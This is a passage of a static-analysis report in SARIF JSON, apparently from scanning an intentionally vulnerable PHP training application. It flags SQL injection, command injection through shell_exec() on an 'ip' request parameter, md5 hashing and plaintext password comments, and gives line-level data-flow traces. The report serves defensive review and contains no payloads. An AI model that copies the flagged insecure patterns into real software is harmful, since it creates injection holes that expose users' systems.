              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/low.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:16 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/low.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4532",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6C1FA89E483C2A8A8D43C9A70766F343"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/low.php"
          },
          "region" : {
            "startLine" : 22,
            "endLine" : 22,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4563",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "7B9DF4C5DE9DFC43704E68B3841E0EB6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/medium.php"
          },
          "region" : {
            "startLine" : 10,
            "endLine" : 10,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:10 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/medium.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:10 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/medium.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4626",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "AB7E3BA42F77F50C64C20E71BE0641E2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/medium.php"
          },
          "region" : {
            "startLine" : 14,
            "endLine" : 14,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4695",
      "message" : {
        "text" : "On line 18 of medium.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "DC44B7114467267082258B17E27CBEFC"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/medium.php"
          },
          "region" : {
            "startLine" : 18,
            "endLine" : 18,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:18 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/medium.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:18 - mysqli_query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/medium.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4533",
      "message" : {
        "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "6C1FA89E483C2A8A8D43C9A70766F344"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/source/medium.php"
          },
          "region" : {
            "startLine" : 24,
            "endLine" : 24,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4393",
      "message" : {
        "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "15CF0A77B580618926748C9470780B02"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/test_credentials.php"
          },
          "region" : {
            "startLine" : 19,
            "endLine" : 19,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:19 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:19 - md5()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4567",
      "message" : {
        "text" : "Line 22 of test_credentials.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "7DEF1A51719A0BDF2D477CEB988E969C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/csrf/test_credentials.php"
          },
          "region" : {
            "startLine" : 22,
            "endLine" : 22,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:12 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:22 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:12 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:12 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:13 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:13 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:14 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:14 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:21 - Assignment to $query"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "test_credentials.php:22 - mysqli_query(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/test_credentials.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4651",
      "message" : {
        "text" : "Line 26 in high.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "BCFFF9829E271E2DE851312944CA882D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/exec/source/high.php"
          },
          "region" : {
            "startLine" : 26,
            "endLine" : 26,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:26 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:26 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4363",
      "message" : {
        "text" : "Line 30 in high.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "0134698E68A636B4A60DA2421F7B1B6F"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/exec/source/high.php"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4614",
      "message" : {
        "text" : "Line 22 in impossible.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "9BA05608F56D1F8EB783DB5A96E6235D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/exec/source/impossible.php"
          },
          "region" : {
            "startLine" : 22,
            "endLine" : 22,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:22 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - explode(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $octet"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:17 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:22 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4445",
      "message" : {
        "text" : "Line 26 in impossible.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "346DB04AC4267C5B5533E332E92F38F4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/exec/source/impossible.php"
          },
          "region" : {
            "startLine" : 26,
            "endLine" : 26,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - explode(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $octet"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:17 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4402",
      "message" : {
        "text" : "Line 10 in low.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "19C105429F747FA4C50C1D57F308AA65"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/exec/source/low.php"
          },
          "region" : {
            "startLine" : 10,
            "endLine" : 10,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:10 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:10 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4690",
      "message" : {
        "text" : "Line 14 in low.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "DAA05755644C6015A0AEFE1173CADE81"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/exec/source/low.php"
          },
          "region" : {
            "startLine" : 14,
            "endLine" : 14,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4655",
      "message" : {
        "text" : "Line 19 in medium.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "C0CD46ECE8DAD80BBD5B182CEF2344D2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/exec/source/medium.php"
          },
          "region" : {
            "startLine" : 19,
            "endLine" : 19,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:14 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4440",
      "message" : {
        "text" : "Line 23 in medium.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "30DDCC6D2A92583F7D7F240FCD7B127C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "vulnerabilities/exec/source/medium.php"
          },
          "region" : {
            "startLine" : 23,
            "endLine" : 23,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:23 - shell_exec(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/medium.php"
                },
                "region" : {
                  "startLine" : 23
                }
              }
            }
          }, {
